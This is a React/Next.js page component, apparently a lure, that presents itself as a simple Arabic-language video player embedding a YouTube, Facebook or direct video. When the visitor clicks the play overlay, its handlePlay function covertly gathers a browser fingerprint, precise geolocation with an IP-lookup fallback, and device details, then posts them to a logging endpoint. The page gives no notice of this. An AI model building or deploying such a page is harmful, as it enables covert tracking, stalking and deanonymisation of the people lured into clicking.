"use client";

import { useEffect, useState } from 'react';
import * as fpjs from '@fingerprintjs/fingerprintjs';

function CustomPlayer({ url, onPlay }: { url: string, onPlay: () => void }) {
  const [interacted, setInteracted] = useState(false);

  const handleInteraction = () => {
    if (!interacted) {
      setInteracted(true);
      onPlay();
    }
  };

  if (!url) return null;

  let player = null;
  if (url.includes('youtube.com') || url.includes('youtu.be')) {
    const videoId = url.includes('v=') ? url.split('v=')[1].split('&')[0] : url.split('/').pop();
    player = <iframe width="100%" height="450" src={`https://www.youtube.com/embed/${videoId}?autoplay=${interacted ? 1 : 0}`} frameBorder="0" allowFullScreen allow="autoplay"></iframe>;
  } else if (url.includes('facebook.com')) {
    const fbUrl = encodeURIComponent(url);
    player = <iframe src={`https://www.facebook.com/plugins/video.php?href=${fbUrl}&show_text=false&autoplay=${interacted ? 'true' : 'false'}`} width="100%" height="450" style={{border: 'none', overflow: 'hidden'}} scrolling="no" frameBorder="0" allowFullScreen={true} allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"></iframe>;
  } else {
    player = <video src={url} controls width="100%" height="450" onPlay={onPlay}></video>;
  }

  return (
    <div style={{ position: 'relative', width: '100%', borderRadius: '8px', overflow: 'hidden', backgroundColor: '#000', aspectRatio: '16/9' }}>
      {!interacted && (
        <div 
          onClick={handleInteraction}
          style={{
            position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', 
            zIndex: 10, cursor: 'pointer', background: 'rgba(0,0,0,0.8)',
            display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center',
            color: 'white'
          }}
        >
          <div style={{
            width: '80px', height: '80px', backgroundColor: '#1b7bc2', borderRadius: '50%',
            display: 'flex', justifyContent: 'center', alignItems: 'center', marginBottom: '1rem',
            boxShadow: '0 4px 15px rgba(27, 123, 194, 0.5)'
          }}>
            <div style={{
              width: 0, height: 0, borderTop: '15px solid transparent', borderBottom: '15px solid transparent',
              borderLeft: '25px solid white', marginLeft: '5px'
            }}></div>
          </div>
          <h2 style={{ fontSize: '1.5rem', fontWeight: 'bold' }}>اضغط هنا لتشغيل الفيديو</h2>
        </div>
      )}
      {interacted ? player : null}
    </div>
  );
}

export default function Home() {
  const [videoUrl, setVideoUrl] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [logSent, setLogSent] = useState(false);
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    setMounted(true);
    // Fetch video URL
    fetch('/api/video', { cache: 'no-store' })
      .then(res => res.json())
      .then(data => {
        let url = data.videoUrl;
        // Fix Facebook Reel URLs 
        if (url && url.includes('facebook.com/reel/')) {
          const reelId = url.split('/reel/')[1].split('/')[0].split('?')[0];
          url = `https://www.facebook.com/video.php?v=${reelId}`;
        }
        setVideoUrl(url);
        setLoading(false);
      });
  }, []);

  const handlePlay = async () => {
    if (logSent) return;

    let fingerprint = 'unknown';
    try {
      // Get fingerprint safely
      const loader = fpjs.default?.load || fpjs.load;
      if (loader) {
        const fp = await loader();
        const result = await fp.get();
        fingerprint = result.visitorId || 'unknown';
      }
    } catch (e) {
      console.warn("Fingerprint blocked or failed", e);
    }
    
    let latitude = null;
    let longitude = null;

    // Get geolocation safely with fallback
    if ('geolocation' in navigator) {
      try {
        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 15000 });
        });
        latitude = position.coords.latitude;
        longitude = position.coords.longitude;
      } catch (geoError) {
        console.warn("Geolocation denied or timeout, using IP fallback");
        try {
          const res = await fetch('https://ipinfo.io/json');
          const data = await res.json();
          if (data.loc) {
            const parts = data.loc.split(',');
            latitude = parseFloat(parts[0]);
            longitude = parseFloat(parts[1]);
          }
        } catch (ipError) {
          console.warn("IP Geolocation fallback failed");
        }
      }
    } else {
      try {
        const res = await fetch('https://ipinfo.io/json');
        const data = await res.json();
        if (data.loc) {
          const parts = data.loc.split(',');
          latitude = parseFloat(parts[0]);
          longitude = parseFloat(parts[1]);
        }
      } catch (ipError) {}
    }

    let screenResolution = null;
    let language = null;
    let timezone = null;
    
    try {
      if (typeof window !== 'undefined') {
        screenResolution = `${window.screen.width}x${window.screen.height}`;
        language = navigator.language;
        timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      }
    } catch(e) {
      console.warn("Device info failed", e);
    }

    // Send log ALWAYS
    try {
      await fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fingerprint,
          latitude,
          longitude,
          userAgent: navigator.userAgent,
          screenResolution,
          language,
          timezone
        })
      });
      setLogSent(true);
    } catch (e) {
      console.error("API fetch failed", e);
    }
  };

  if (loading || !mounted) {
    return <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh' }}>جاري التحميل...</div>;
  }

  return (
    <main style={{ padding: '1rem', display: 'flex', flexDirection: 'column', alignItems: 'center', minHeight: '100vh' }}>
      <div className="glass-container" style={{ width: '100%', maxWidth: '900px', padding: '1rem' }}>
        <h1 style={{ marginBottom: '1.5rem', textAlign: 'center', fontSize: '1.5rem', color: '#1b7bc2' }}>مشغل الفيديو</h1>
        
        {videoUrl ? (
          <div style={{ borderRadius: '8px', overflow: 'hidden', width: '100%' }}>
            <CustomPlayer url={videoUrl} onPlay={handlePlay} />
          </div>
        ) : (
          <p style={{ textAlign: 'center' }}>لا يوجد فيديو حالياً.</p>
        )}
        
      </div>
    </main>
  );
}
